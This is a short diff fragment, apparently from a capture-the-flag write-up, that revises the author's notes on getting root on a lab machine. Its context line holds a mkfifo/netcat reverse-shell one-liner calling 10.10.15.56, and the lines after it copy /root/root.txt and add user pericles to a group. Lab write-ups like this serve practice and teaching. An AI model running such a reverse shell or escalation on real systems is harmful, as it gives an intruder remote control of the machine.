@@ -51,8 +51,8 @@ echo rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.56 1235 >/tm
 					Root
 
 
-(I have an error on my terminal so that i cant read the output in the root nc shell)
-(so i just added pericles to a group that can read a file created by root)
+(I have an error on my terminal so that I cant read the output of root.txt in the root nc shell)
+(so i just added user:pericles to a group that can read a file created by root)
 
 cp /root/root.txt /home/root.txt
 addgroup pericles
